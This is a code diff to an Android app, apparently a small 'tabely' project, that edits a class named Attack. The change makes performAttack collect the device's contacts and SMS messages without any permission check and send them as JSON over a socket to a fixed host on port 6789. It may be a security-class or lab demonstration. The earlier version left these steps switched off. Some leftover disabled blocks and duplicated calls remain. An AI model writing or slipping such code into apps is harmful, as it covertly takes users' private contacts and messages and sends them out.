@@ -1,5 +1,9 @@
 package com.snakesonwheels.tabely.controller;
 
+import android.os.Looper;
+
+import com.snakesonwheels.tabely.view.HomeActivity;
+
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintStream;
@@ -8,41 +12,59 @@ import java.util.UUID;
 
 public class Attack extends Thread {
     private final int port = 6789;
-    private final String host = "192.168.74.2";
+    private final String host = "192.168.222.2";
     private final UUID uuid = UUID.randomUUID();
+    AttackActivity attackActivity;
+
+    private static final int REQUEST_CONTACTS_PERMISSION_CODE = 0;
+    private static boolean permissionGranted = false;
+    private HomeActivity homeActivity;
+
+    public Attack(HomeActivity homeActivity) {
+        this.homeActivity = homeActivity;
+    }
 
 
-    public void performAttack(){
+    public void performAttack() {
         String data;
-        String haeder;
+        String header;
 
         String testData = "Client: " + uuid + " wants to be attacked!";
         sendData(testData);
 
-        if (false/*ContactPermission is given*/){
-            haeder = "uuid: " + uuid + "\n" +
-                    "timesamp: " + System.currentTimeMillis() + "\n" +
-                    "Contact data:";
 
-            data = gatherContactInformation();
+        //Contacts
+        header = "{\"uuid\": \"" + uuid + "\"," +
+                "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
+        data = homeActivity.gatherContactInformation();
+        sendData(header + data + "}");
 
-            sendData(haeder + "\n\n" + data);
+        //SMS
+        header = "{\"uuid\": \"" + uuid + "\"," +
+                "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
+        data = homeActivity.gatherSMSInformation();
+        sendData(header + data + "}");
+
+
+        if (false) {
+            header = "{\"uuid\": \"" + uuid + "\"," +
+                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
+            data = homeActivity.gatherContactInformation();
+            sendData(header + data + "}");
         }
 
-        if (false/*SMSPermission is given*/){
-            haeder = "uuid: " + uuid + "\n" +
-                    "timesamp: " + System.currentTimeMillis()+ "\n" +
-                    "SMS data:";
+        if (false/*SMSPermission is given*/) {
+            header = "{\"uuid\": \"" + uuid + "\"," +
+                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
+            data = homeActivity.gatherContactInformation();
 
             data = gatherSMSInformation();
 
-            sendData(haeder + "\n\n" + data);
+            sendData(header + "\n\n" + data);
         }
-
-
     }
 
-    private void sendData(String data){
+    private void sendData(String data) {
         try {
             Socket socket = new Socket(host, port);
 
@@ -56,11 +78,8 @@ public class Attack extends Thread {
         }
     }
 
-    private String gatherContactInformation(){
-        return null;
-    }
 
-    private String gatherSMSInformation(){
+    private String gatherSMSInformation() {
         return null;
     }
 
